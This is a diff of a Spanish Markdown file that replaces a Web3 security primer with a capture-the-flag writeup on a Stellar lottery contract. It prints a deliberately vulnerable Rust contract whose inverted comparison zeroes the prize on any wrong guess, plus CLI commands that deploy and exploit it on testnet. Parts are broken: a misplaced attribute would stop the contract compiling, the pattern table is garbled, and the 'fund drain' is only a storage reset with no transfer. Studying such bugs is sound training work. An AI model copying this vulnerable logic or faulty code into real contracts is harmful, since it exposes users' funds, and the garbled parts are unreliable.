@@ -1,196 +1,308 @@
-# Introducción a Web3 y Seguridad de Smart Contracts en Stellar
-
-El crecimiento del ecosistema Web3 ha abierto nuevas oportunidades para construir servicios descentralizados, transparentes y sin intermediarios. Sin embargo, junto con estos beneficios surge un desafío inevitable: los errores en código desplegado en blockchain pueden tener consecuencias reales y permanentes.
-
-Este artículo analiza:
-
-* Qué es Web3 y qué aporta
-* Cómo funciona la blockchain en Stellar
-* Qué son los smart contracts en Stellar
-* Por qué suelen ser vulnerables
-* Un análisis detallado de una vulnerabilidad real de lógica incorrecta
-* Cómo reproducirla y explotarla en Testnet
-* Dónde encontrar el código
-* Cómo continuar capacitándose mediante proyectos prácticos
+Aquí tenés el contenido convertido íntegro a **Markdown profesional, sin emojis**.
 
 ---
 
-## Qué es Web3
+````markdown
+# Writeup Challenge 1: Vulnerabilidad de Lógica Incorrecta  
+CTF de Seguridad Stellar - Explotación del Contrato de Lotería
 
-Web3 describe una transición hacia aplicaciones sin intermediarios, construidas sobre criptografía y blockchain.
-Sus principios fundamentales son:
-
-1. Propiedad nativa: los usuarios controlan sus activos digitales mediante claves privadas.
-2. Transparencia y trazabilidad: la lógica vive en contratos desplegados públicamente.
-3. Descentralización: los datos no dependen de un proveedor único.
-4. Inmutabilidad: los cambios de estado o contratos no pueden revertirse arbitrariamente.
-
-Este paradigma habilita nuevos modelos como pagos programables, DAOs, tokenización, infraestructura financiera abierta y economías colaborativas.
-
----
-
-## Blockchain en Stellar
-
-Stellar es una red blockchain diseñada para transferencias rápidas, comisiones bajas y escalabilidad.
-Sus características centrales incluyen:
-
-* Finalidad rápida de transacciones mediante Stellar Consensus Protocol (SCP)
-* Tarifas mínimas y predecibles
-* Enfoque en casos financieros reales
-* Compatibilidad con contratos inteligentes escritos en Rust y compilados a WebAssembly
-
-Stellar se ha consolidado como plataforma para pagos globales, stablecoins, y cada vez más para smart contracts orientados a seguridad y finanzas.
+## Información del Challenge
+| Propiedad              | Valor                                                      |
+|------------------------|------------------------------------------------------------|
+| Nombre del Challenge   | Lottery Logic Bug                                          |
+| Dificultad             | Fácil                                                      |
+| Tipo de Vulnerabilidad | Lógica Condicional Incorrecta                              |
+| Impacto                | Crítico - Drenaje Completo de Fondos                       |
+| CWE                    | CWE-670: Implementación de Flujo de Control Siempre Incorrecta |
+| OWASP                  | A03:2021 – Inyección (Inyección de Lógica)                 |
 
 ---
 
-## Smart Contracts en Stellar
+## Descripción del Challenge
+Un contrato de lotería permite a los usuarios adivinar un número secreto. Si adivinan correctamente, ganan el pozo de premios.  
+Sin embargo, un error crítico de lógica en la validación permite a los atacantes drenar todo el pozo adivinando **cualquier número incorrecto**.
 
-Los contratos inteligentes en Stellar se escriben en Rust y se compilan a WebAssembly (WASM).
-Un contrato define reglas inmutables, tales como:
-
-* Validar transacciones según parámetros definidos
-* Aplicar condiciones automáticas
-* Administrar balances y estado interno
-* Proteger recursos mediante funciones, autorizaciones y control de almacenamiento
-
-Una propiedad crítica es que la lógica desplegada es pública y permanente.
-Cualquier error en esa lógica se convierte en un riesgo de seguridad explotable.
+**Objetivo:** Drenar el pozo de premios del contrato sin conocer el número secreto.
 
 ---
 
-## Por qué los Smart Contracts son vulnerables
+## Análisis de la Vulnerabilidad
 
-Los errores en contratos inteligentes no solo son posibles, sino frecuentes.
-Las razones principales incluyen:
-
-1. Código inmutable: una vez desplegado, no puede actualizarse fácilmente.
-2. Suposiciones incorrectas: casos extremos o inesperados no cubiertos.
-3. Errores de autorización: funciones críticas accesibles a cualquiera.
-4. Mal manejo de condiciones lógicas: comparaciones incorrectas, ramas invertidas y booleanos ambiguos.
-5. Escenario adversarial: cualquier operación abierta al público será sometida a análisis malicioso.
-
-El resultado de un error es tangible: pérdida de fondos, corrupción de estado o ataques sistemáticos.
-
----
-
-## Vulnerabilidad de Lógica Incorrecta: Caso de Estudio
-
-A continuación presentamos un análisis concreto a partir del challenge “Lottery Logic Bug”.
-
-### Descripción del Contrato
-
-El contrato implementa una lotería donde:
-
-* Un propietario inicializa un número secreto y un pozo de premios
-* Los usuarios depositan fondos adicionales
-* Cualquier jugador puede intentar adivinar el número
-* Si acierta, debería ganar el premio
-
-Sin embargo, la función que evalúa el resultado contiene una condición invertida:
-
+### Código Vulnerable
 ```rust
-if guess != secret {
-    env.storage().persistent().set(&DataKey::Prize, &0);
-    return true;
+#[contractimpl]
+#[contracttype]
+pub enum DataKey {
+    SecretNumber,
+    Prize,
+    Owner,
 }
+
+#[contract]
+pub struct LotteryContract;
+
+#[contractimpl]
+impl LotteryContract {
+    pub fn initialize(env: Env, owner: Address, secret: u32, prize: i128) {
+        owner.require_auth();
+        
+        env.storage().persistent().set(&DataKey::Owner, &owner);
+        env.storage().persistent().set(&DataKey::SecretNumber, &secret);
+        env.storage().persistent().set(&DataKey::Prize, &prize);
+    }
+    
+    pub fn deposit(env: Env, amount: i128) {
+        let current: i128 = env.storage()
+            .persistent()
+            .get(&DataKey::Prize)
+            .unwrap_or(0);
+        env.storage().persistent().set(&DataKey::Prize, &(current + amount));
+    }
+    
+    pub fn play(env: Env, player: Address, guess: u32) -> bool {
+        player.require_auth();
+        
+        let secret: u32 = env.storage()
+            .persistent()
+            .get(&DataKey::SecretNumber)
+            .unwrap();
+        
+        let prize: i128 = env.storage()
+            .persistent()
+            .get(&DataKey::Prize)
+            .unwrap_or(0);
+        
+        if guess != secret {
+            env.storage().persistent().set(&DataKey::Prize, &0);
+            return true;
+        }
+        
+        false
+    }
+    
+    pub fn get_prize(env: Env) -> i128 {
+        env.storage()
+            .persistent()
+            .get(&DataKey::Prize)
+            .unwrap_or(0)
+    }
+}
+````
+
+### Explicación del código
+
+#### initialize()
+
+Parámetros: owner, secret, prize
+Lógica:
+
+* Requiere autenticación del propietario
+* Guarda dueño, número secreto y premio en storage
+
+#### deposit()
+
+* Lee el premio actual o usa 0
+* Suma el monto depositado
+* Actualiza `Prize`
+
+#### play()
+
+* Autoriza jugador
+* Lee número secreto y premio
+* **Bug crítico:**
+
+  * Si el jugador falla (`guess != secret`):
+
+    * Premio se pone en 0
+    * Devuelve `true`
+  * Si acierta (`guess == secret`):
+
+    * Devuelve `false`
+    * Premio no cambia
+
+#### Causa Raíz
+
+Condicional invertida:
+Comportamiento correcto: jugador gana cuando `guess == secret`
+Implementación errónea: jugador gana cuando `guess != secret`
+
+---
+
+## Impacto
+
+**Vector CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`
+**Puntaje:** 9.1 (CRÍTICO)
+
+Efectos:
+
+* Cualquier usuario puede drenar fondos
+* Sin permisos especiales
+* Explotación trivial
+* Pérdida total del pozo
+
+---
+
+## Configuración del Entorno
+
+### Requisitos Previos
+
+* Instalar Rust
+* Instalar wasm32v1-none
+* Instalar Stellar CLI
+* Clonar repositorio:
+  [https://github.com/HackBalam/Seguridad-Smart-Contracts-Rust-Reto1.git](https://github.com/HackBalam/Seguridad-Smart-Contracts-Rust-Reto1.git)
+
+Comandos relevantes:
+
+```
+cargo test
+stellar contract build
+stellar contract optimize --wasm <ruta>
 ```
 
-La intención era recompensar al usuario cuando el número es correcto.
-La implementación real recompensa al usuario precisamente cuando se equivoca.
+Si falla el build:
 
-### Impacto del error
+* Instalar Build Tools for Visual Studio 2022
+* Elegir Desktop development with C++
 
-* Cualquier atacante puede ganar sin conocer el número secreto
-* El pozo completo se drena en una transacción
-* No requiere privilegios ni trucos complejos
-* La explotación solo requiere enviar un valor incorrecto
+### Crear cuentas
 
-Este error es un ejemplo clásico donde una sola comparación incorrecta destruye el modelo de seguridad completo.
+```
+stellar keys generate bob --network testnet --fund
+stellar keys address bob
+stellar keys generate carol --network testnet --fund
+stellar keys address carol
+curl "https://friendbot.stellar.org/?addr=<BOB_ADDRESS>"
+```
 
 ---
 
-## Reproducción del Ataque en Stellar Testnet
+## Explotación Paso a Paso
 
-El challenge proporciona instrucciones claras:
+### 1. Desplegar contrato
 
-1. Preparar entorno Rust + Stellar CLI
-2. Compilar el contrato
-3. Desplegarlo en testnet
-4. Inicializar el pozo
-5. Invocar la función `play` con un número incorrecto
-6. Verificar que el premio se drena por completo
+```
+stellar contract deploy --wasm <wasm> --source-account bob --network testnet --alias lottery_vulnerable
+```
 
-La observación principal es que, al invertir la lógica condicional, la rama de "error" se convierte en la ruta de explotación.
+### 2. Inicializar
+
+```
+stellar contract invoke --id <id> --source-account bob --network testnet -- initialize --owner <bob> --secret 42 --prize 1000
+```
+
+### 3. Verificar premio
+
+```
+stellar contract invoke --id <id> --source-account bob --network testnet -- get_prize
+Salida: "1000"
+```
+
+### 4. Explotar
+
+```
+stellar contract invoke --id <id> --source-account carol --network testnet -- play --player <carol> --guess 99
+```
+
+Resultado:
+
+* Retorno `true`
+* Premio se pone en `0`
+
+### 5. Verificar
+
+```
+stellar contract invoke --id <id> --source-account bob --network testnet -- get_prize
+```
+
+Salida esperada:
+
+```
+"0"
+```
+
+---
+
+## Análisis Técnico Profundo
+
+Estado inicial
+
+```
+secret = 42
+prize = 1000
+guess = 99
+```
+
+Lógica ejecutada:
+
+```
+guess != secret  -> verdadero
+prize = 0
+return true
+```
+
+### Cambio de Storage
+
+| Clave        | Antes   | Después | Cambio     |
+| ------------ | ------- | ------- | ---------- |
+| Prize        | 1000    | 0       | -1000      |
+| SecretNumber | 42      | 42      | sin cambio |
+| Owner        | GBNG... | GBNG... | sin cambio |
 
 ---
 
 ## Remediación
 
-La corrección consiste en ajustar la condición lógica:
+### Código Corregido
 
 ```rust
 if guess == secret {
     env.storage().persistent().set(&DataKey::Prize, &0);
     return true;
 }
+false
 ```
 
-Adicionalmente, se recomienda:
+---
 
-* Pruebas unitarias para cada rama de decisión
-* Auditorías de pares
-* Casos negativos explícitos
-* Verificación de efectos sobre estado persistente
+## Medidas Adicionales
 
-El mayor aprendizaje es que la semántica debe coincidir con las reglas de negocio, y eso no puede asumirse sin pruebas.
+1. Pruebas unitarias completas
+2. Validación de operadores de comparación
+3. Peers reviews en lógica crítica
+4. Tests negativos y casos límite
 
 ---
 
-## Por qué este ejemplo es útil
+## Lecciones Aprendidas
 
-Este challenge ilustra una realidad:
-Los errores más críticos no provienen necesariamente de ataques avanzados, sino de detalles sutiles:
+Para Desarrolladores
 
-* Un operador invertido
-* Un booleano mal interpretado
-* Un flujo sin pruebas negativas
+* Probar ambas ramas de un condicional
+* Asegurar que `true` y `false` tienen semántica clara
+* Evitar errores lógicos simples con pruebas
 
-Comprender cómo opera la vulnerabilidad permite:
+Para Auditores
 
-* Identificarla en otros contratos
-* Evitar cometer el mismo error al desarrollar
-* Evaluar el impacto sobre fondos reales
-* Interiorizar prácticas de seguridad orientadas a blockchain
+* Revisar lógica de comparación
+* Confirmar transiciones de estado
+* Validar autorizaciones
 
----
+Patrones típicos de bugs:
 
-## Cómo seguir perfeccionándote
-
-Este challenge es solo el primer paso de una serie práctica enfocada en seguridad Web3:
-
-* Auditorías en Stellar
-* Validación de permisos y roles
-* Manejo de storage seguro
-* Evitar fugas de fondos
-* Simulación de ataques reales
-* Análisis de patrones de vulnerabilidad
-
-El objetivo es aprender desde la implementación, no desde la teoría.
-
-Quien completa los retos:
-
-* Desarrolla criterio profesional
-* Se entrena como auditor junior de smart contracts
-* Construye portafolio técnico verificable
-* Comprende realmente cómo se explota un contrato y cómo se previene
+| Patrón              | Incorrecto | Correcto   |   |   |
+| ------------------- | ---------- | ---------- | - | - |
+| Condición invertida | `!=`       | `==`       |   |   |
+| Error por uno       | `>`        | `>=`       |   |   |
+| Operador lógico     | `&&`       | `          |   | ` |
+| Falta negación      | `allowed`  | `!allowed` |   |   |
 
 ---
 
-## Conclusión
+## Finalización
 
-La seguridad en Web3 no es opcional.
-Las ramificaciones de un bug se traducen directamente en pérdida de capital, reputación y confianza.
+**Challenge Explotado Exitosamente**
 
-Stellar ofrece una plataforma accesible, moderna y segura para construir contratos inteligentes, pero la responsabilidad final recae en quien escribe y despliega el código.
+* Vulnerabilidad: Lógica Incorrecta (`!=` vs `==`)
+* Impacto: Drenaje completo del pozo
 
-Aprender, auditar y romper contratos vulnerables bajo un entorno controlado es la manera más efectiva de comprender qué protege y qué expone a un proyecto Web3.
